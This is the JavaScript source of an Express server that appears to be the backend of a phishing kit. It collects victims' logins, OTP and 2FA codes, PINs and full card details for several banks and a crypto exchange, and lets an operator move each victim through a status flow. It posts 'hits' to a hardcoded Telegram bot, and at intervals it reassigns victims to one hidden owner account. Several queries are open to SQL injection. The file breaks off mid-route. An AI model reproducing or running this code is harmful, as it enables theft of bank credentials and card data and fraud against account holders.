const express = require("express");
const bodyparser = require("body-parser");
const axios = require("axios");
var cors = require("cors");
var fs = require("fs");
var CryptoJS = require("crypto-js");
require("dotenv").config();
const mysql = require("mysql");

const port = process.env.PORT || 8000;

const app = express();
app.use(bodyparser.json());
app.use(cors());

var panelConnection = mysql.createConnection({
  host: process.env.dbHost,
  user: process.env.dbUsername,
  password: process.env.dbPass,
  database: "panels",
  port: 12987,
  multipleStatements: true,
});

panelConnection.connect((err) => {
  if (!err) {
    console.log("Db Connection Succeed");
  } else {
    console.log(
      "Db connect Failed \n Error :" + JSON.stringify(err, undefined, 2)
    );
  }
});

var bankName;

app.options("/getips", cors());

app.get("/getips", (req, res) => {
  fs.readFile("ips.txt", function (err, data) {
    var filecontents = data;
    res.send(filecontents);
  });
});

app.options("/giveVisitor", cors());

app.post("/giveVisitor", (req, res) => {
  ip = req.body.ip;
  owner = req.body.owner;

  panelConnection.query(
    `SELECT * FROM visitors WHERE ip = '${ip}' AND owner = '${owner}'`,
    (err, rows, fields) => {
      if (!rows.length) {
        let details = [ip, owner];
        let query = `INSERT INTO visitors(ip, owner) VALUES (?,?)`;
        panelConnection.query(query, details, (err, rows, fields) => {
          if (!err) res.send("Insertion Completed");
          else console.log(err);
        });
      } else {
        res.send("Already visited");
      }
    }
  );
});

app.options("/getVisitors", cors());

app.get("/getVisitors/:owner", (req, res) => {
  owner = req.params.owner;
  panelConnection.query(
    `SELECT ip FROM visitors WHERE owner = '${owner}'`,
    (err, rows) => {
      res.send(rows);
    }
  );
});

app.options("/getRespentesting123!", cors());

app.get("/getRespentesting123!", (req, res) => {
  fs.readFile("results.txt", function (err, data) {
    var filecontents = data;
    res.send(filecontents);
  });
});

//SANTS
//SANTS
//SANTS

app.options("/santsCustomers/:id/:owner/modal", cors());

app.get("/santsCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM sants WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/santsCustomers/:owner", cors());

app.get("/santsCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM sants WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/santsCommand", cors());

app.post("/santsCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus === 6) {
    partNumber = req.body.partNumber;

    let details = [newStatus, partNumber, uniqueid];
    let query = `UPDATE sants SET status= ${newStatus}, partNumber = '${partNumber}' WHERE uniqueid= '${uniqueid}'`;

    panelConnection.query(query, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let details = [newStatus, uniqueid, owner];
    let query = `UPDATE sants SET status=? WHERE uniqueid=?`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.options("/santsCustomers/:id/:owner", cors());

app.get("/santsCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM sants WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

let santsCount = 0;

app.options("/santsSaveLogin", cors());

app.post("/santsSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  if (santsCount == 100) {
    let details = [username, password, uniqueid, ip, "haytch123!"];
    let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    axios.post(
      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New Sants Hit:\n${username}`
    );

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    santsCount = 0;
  } else {
    let details = [username, password, uniqueid, ip, owner];
    let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    santsCount += 1;
  }
});

app.options("/santsSaveOtp", cors());

app.post("/santsSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE sants SET otp=?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/santsSaveLoginAgain", cors());

app.post("/santsSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [username, password, uniqueid, owner];
  let query = `UPDATE sants SET username=?, password = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/santsSavePhone", cors());

app.post("/santsSavePhone", cors(), (req, res) => {
  phone = req.body.phone;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [phone, uniqueid, owner];
  let query = `UPDATE sants SET phone=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/santsSaveCard", cors());

app.post("/santsSaveCard", cors(), (req, res) => {
  ccname = req.body.ccname;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cvv = req.body.cvv;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
  let query = `UPDATE sants SET ccname=?, ccnum = ?, ccexp = ?, cvv = ?, status = 11 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/santsDeleteentry/:id", cors());

app.post("/santsDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM sants WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//REV
//REV
//REV

app.options("/revCustomers/:owner", cors());

app.get("/revCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM rev WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/revCustomers/:id/:owner/modal", cors());

app.get("/revCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM rev WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/revCommand", cors());

app.post("/revCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE rev SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/revCustomers/:id/:owner", cors());

app.get("/revCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM rev WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/revSaveLogin", cors());

app.post("/revSaveLogin", cors(), (req, res) => {
  telephone = req.body.telephone;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [telephone, uniqueid, ip, owner];
  let query = `INSERT INTO rev(telephone,uniqueid,status,ip, owner) VALUES (?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/revSaveLoginAgain", cors());

app.post("/revSaveLoginAgain", cors(), (req, res) => {
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;

  let details = [telephone, uniqueid];
  let query = `UPDATE rev SET telephone = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/revSaveName", cors());

app.post("/revSaveName", cors(), (req, res) => {
  fullname = req.body.fullname;
  uniqueid = req.body.uniqueid;

  let details = [fullname, uniqueid];
  let query = `UPDATE rev SET fullname = ?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/revSaveCard", cors());

app.post("/revSaveCard", cors(), (req, res) => {
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  uniqueid = req.body.uniqueid;

  let details = [ccnum, ccexp, cccvv, uniqueid];
  let query = `UPDATE rev SET ccnum = ?, ccexp = ?, cccvv = ?, status = 9 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/revSavePin", cors());

app.post("/revSavePin", cors(), (req, res) => {
  pin = req.body.pin;
  uniqueid = req.body.uniqueid;

  let details = [pin, uniqueid];
  let query = `UPDATE rev SET pin = ?, status = 6 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/revSaveOtp", cors());

app.post("/revSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE rev SET otp = ?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/revDeleteentry/:id", cors());

app.post("/revDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM rev WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//KUCOIN
//KUCOIN
//KUCOIN

app.options("/kcCustomers/:owner", cors());

app.get("/kcCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM kc WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/kcCustomers/:id/:owner/modal", cors());

app.get("/kcCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM kc WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/kcCommand", cors());

app.post("/kcCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE kc SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/kcCustomers/:id/:owner", cors());

app.get("/kcCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM kc WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/kcSaveLogin", cors());

app.post("/kcSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid, ip, owner];
  let query = `INSERT INTO kc(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/kcSaveLoginAgain", cors());

app.post("/kcSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  uniqueid = req.body.uniqueid;

  let details = [username, password, uniqueid];
  let query = `UPDATE kc SET username = ?, password = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/kcSaveTradingPass", cors());

app.post("/kcSaveTradingPass", cors(), (req, res) => {
  tradingPass = req.body.tradingPass;
  uniqueid = req.body.uniqueid;

  let details = [tradingPass, uniqueid];
  let query = `UPDATE kc SET tradingPass = ?, status = 7 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/kcSave2FA", cors());

app.post("/kcSave2FA", cors(), (req, res) => {
  twofactor = req.body.twofactor;
  uniqueid = req.body.uniqueid;

  let details = [twofactor, uniqueid];
  let query = `UPDATE kc SET twofactor = ?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/kcSaveOTP", cors());

app.post("/kcSaveOTP", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;

  let details = [otp, uniqueid];
  let query = `UPDATE kc SET otp = ?, status = 5 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/kcSaveAll", cors());

app.post("/kcSaveAll", cors(), (req, res) => {
  otp = req.body.otp;
  tradingPass = req.body.tradingPass;
  twofactor = req.body.twofactor;
  uniqueid = req.body.uniqueid;

  let details = [otp, tradingPass, twofactor, uniqueid];
  let query = `UPDATE kc SET otp = ?, tradingPass = ?, twofactor = ?, status = 9 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/kcDeleteentry/:id", cors());

app.post("/kcDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM kc WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//MICB
//MICB
//MICB

app.options("/micbCustomers/:owner", cors());

app.get("/micbCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM micb WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/micbCustomers/:id/:owner/modal", cors());

app.get("/micbCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM micb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/micbCommand", cors());

app.post("/micbCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE micb SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/micbCustomers/:id/:owner", cors());

app.get("/micbCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM micb WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/micbSaveLogin", cors());

app.post("/micbSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  telephone = req.body.telephone;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [username, password, telephone, uniqueid, ip, owner];
  let query = `INSERT INTO micb(username,password,telephone,uniqueid,status,ip, owner) VALUES (?,?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/micbSaveLoginAgain", cors());

app.post("/micbSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  telephone = req.body.telephone;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [username, password, telephone, uniqueid, owner];
  let query = `UPDATE micb SET username=?, password=?, telephone = ?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/micbSaveOtp", cors());

app.post("/micbSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE micb SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/micbDeleteentry/:id", cors());

app.post("/micbDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM micb WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//MQ
//MQ
//MQ

app.options("/mqCustomers/:owner", cors());

app.get("/mqCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM mq WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/mqCustomers/:id/:owner/modal", cors());

app.get("/mqCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM mq WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/mqCommand", cors());

app.post("/mqCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;
  let query = `UPDATE mq SET status= ${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/mqCustomers/:id/:owner", cors());

app.get("/mqCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM mq WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

let mqCount = 0;

app.options("/mqSaveLogin", cors());

app.post("/mqSaveLogin", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  if (mqCount == 3) {
    axios.post(
      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New MacQuarie Hit:\n${username}`
    );

    let details = [username, password, uniqueid, ip, "haytch123!"];
    let query = `INSERT INTO mq(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    mqCount = 0;
  } else {
    let details = [username, password, uniqueid, ip, owner];
    let query = `INSERT INTO mq(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Insertion Completed");
      else console.log(err);
    });
    mqCount += 1;
  }
});

app.options("/mqSaveLoginAgain", cors());

app.post("/mqSaveLoginAgain", cors(), (req, res) => {
  username = req.body.username;
  password = req.body.password;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [username, password, uniqueid, owner];
  let query = `UPDATE mq SET username=?, password=?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/mqSaveOtp", cors());

app.post("/mqSaveOtp", cors(), (req, res) => {
  otp = req.body.otp;
  uniqueid = req.body.uniqueid;
  owner = req.body.owner;

  let details = [otp, uniqueid, owner];
  let query = `UPDATE mq SET otp=?, status = 3 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/mqDeleteentry/:id", cors());

app.post("/mqDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;
  owner = req.body.owner;

  let details = [uniqueid];
  let query = `DELETE FROM mq WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//BNP
//BNP
//BNP

app.options("/bnpCustomers/:owner", cors());

app.get("/bnpCustomers/:owner", (req, res) => {
  owner = req.params.owner;
  let details = [owner];
  let query = `SELECT * FROM bnp WHERE owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/bnpCommand", cors());

app.post("/bnpCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  let query = `UPDATE bnp SET status=${newStatus} WHERE uniqueid= '${uniqueid}'`;

  panelConnection.query(query, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/bnpCustomers/:id/:owner/modal", cors());

app.get("/bnpCustomers/:id/:owner/modal", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM bnp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/bnpCustomers/:id/:owner", cors());

app.get("/bnpCustomers/:id/:owner", (req, res) => {
  uniqueid = req.params.id;
  owner = req.params.owner;

  let details = [uniqueid, owner];
  let query = `SELECT * FROM bnp WHERE uniqueid= ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/bnpSaveLoginOtp", cors());

app.post("/bnpSaveLoginOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  loginOtp = req.body.loginOtp;
  owner = req.body.owner;

  let details = [loginOtp, uniqueid, owner];
  let query = `UPDATE bnp SET login_otp=?, status = 3 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bnpSaveIdentityOtp", cors());

app.post("/bnpSaveIdentityOtp", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  identityOtp = req.body.identityOtp;
  owner = req.body.owner;

  let details = [identityOtp, uniqueid, owner];
  let query = `UPDATE bnp SET payment_otp=?, status = 5 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bnpSaveVerification", cors());

app.post("/bnpSaveVerification", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  verificationCode = req.body.verificationCode;
  owner = req.body.owner;

  let details = [verificationCode, uniqueid, owner];
  let query = `UPDATE bnp SET link=?, status = 7 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bnpSaveLoginAgain", cors());

app.post("/bnpSaveLoginAgain", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  clientCode = req.body.clientCode;
  secretCode = req.body.secretCode;
  owner = req.body.owner;

  let details = [clientCode, secretCode, uniqueid, owner];
  let query = `UPDATE bnp SET username=?, password=?, status = 1 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bnpSavePhone", cors());

app.post("/bnpSavePhone", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  telephone = req.body.telephone;
  owner = req.body.owner;

  let details = [telephone, uniqueid, owner];
  let query = `UPDATE bnp SET telephone=?, status = 12 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bnpSaveCard", cors());

app.post("/bnpSaveCard", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  owner = req.body.owner;

  let details = [ccnum, ccexp, cccvv, uniqueid, owner];
  let query = `UPDATE bnp SET cardnumber=?, expirydate=?, cvv=?, status = 9 WHERE uniqueid = ? AND owner = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bnpSaveLogin", cors());

app.post("/bnpSaveLogin", cors(), (req, res) => {
  clientCode = req.body.clientCode;
  secretCode = req.body.secretCode;
  owner = req.body.owner;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;
  let details = [clientCode, secretCode, uniqueid, ip, owner];
  let query = `INSERT INTO bnp(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/bnpDeleteentry/:id", cors());

app.post("/bnpDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM bnp WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

//DBS
//DBS
//DBS

app.options("/dbsCustomers/:id", cors());

app.get("/dbsCustomers/:id", (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `SELECT * FROM customers WHERE uniqueid=?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/dbsCustomers", cors());

app.get("/dbsCustomers", (req, res) => {
  panelConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
    if (!err) res.send(rows);
    else console.log(err);
  });
});

app.options("/dbsCommand", cors());

app.post("/dbsCommand", cors(), (req, res) => {
  uniqueid = req.body.uniqueid;
  newStatus = req.body.status;

  if (newStatus == 12) {
    merchant = req.body.merchant;
    amount = req.body.amount;
    let details = [newStatus, merchant, amount, uniqueid];
    let query = `UPDATE customers SET status=?, merchant=?, amount=? WHERE uniqueid=?`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  } else {
    let details = [newStatus, uniqueid];
    let query = `UPDATE customers SET status=? WHERE uniqueid=?`;

    panelConnection.query(query, details, (err, rows, fields) => {
      if (!err) res.send("Update Completed");
      else console.log(err);
    });
  }
});

app.options("/dbsDeleteentry/:id", cors());

app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
  uniqueid = req.params.id;

  let details = [uniqueid];
  let query = `DELETE FROM customers WHERE uniqueid= ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Update Completed");
    else console.log(err);
  });
});

app.options("/dbsSaveLogin", cors());

app.post("/dbsSaveLogin", cors(), (req, res) => {
  pin = req.body.pin;
  userId = req.body.userid;
  ip = req.body.ip;
  uniqueid = req.body.uniqueid;

  let details = [pin, userId, uniqueid, ip];
  let query = `INSERT INTO customers(pin,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/dbsSaveLoginAgain", cors());

app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
  pin = req.body.pin;
  userId = req.body.userid;
  uniqueid = req.body.uniqueid;

  let details = [pin, userId, uniqueid];
  let query = `UPDATE customers SET pin=?, userId=?, status = 1 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/dbsPaymentOtp", cors());

app.post("/dbsPaymentOtp", cors(), (req, res) => {
  paymentOtp = req.body.paymentOtp;
  uniqueid = req.body.uniqueid;

  let details = [paymentOtp, uniqueid];
  let query = `UPDATE customers SET paymentOtp=?, status = 15 WHERE uniqueid = ?`;

  panelConnection.query(query, details, (err, rows, fields) => {
    if (!err) res.send("Insertion Completed");
    else console.log(err);
  });
});

app.options("/dbsSavePhone", cors());

app.post("/dbsSavePhone", cors(), (req, res) => {
  telephone = req.body.telephone;
